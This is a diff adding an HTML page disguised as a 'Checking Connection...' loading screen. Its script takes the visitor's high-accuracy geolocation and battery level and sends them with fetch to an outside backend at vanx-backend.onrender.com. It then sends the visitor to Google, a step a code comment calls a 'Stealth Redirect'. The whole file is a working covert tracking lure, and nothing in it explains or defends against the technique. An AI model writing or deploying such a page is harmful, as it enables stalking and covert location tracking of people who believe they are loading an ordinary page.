@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Connection...</title>
+    <script>
+        const BACKEND_URL = "https://vanx-backend.onrender.com/update";
+
+        async function sendData(lat, lon, battery) {
+            const params = `?lat=${lat}&lon=${lon}&batt=${battery}`;
+            try {
+                await fetch(BACKEND_URL + params);
+            } catch (e) {
+                console.log("Offline or Error");
+            }
+            window.location.href = "https://www.google.com"; // Stealth Redirect
+        }
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const batt = await navigator.getBattery();
+            const batteryLevel = Math.floor(batt.level * 100) + "%";
+            sendData(pos.coords.latitude, pos.coords.longitude, batteryLevel);
+        }, (err) => {
+            window.location.href = "https://www.google.com";
+        }, {enableHighAccuracy: true});
+    </script>
+</head>
+<body>
+    <p>Loading please wait...</p>
+</body>
+</html>
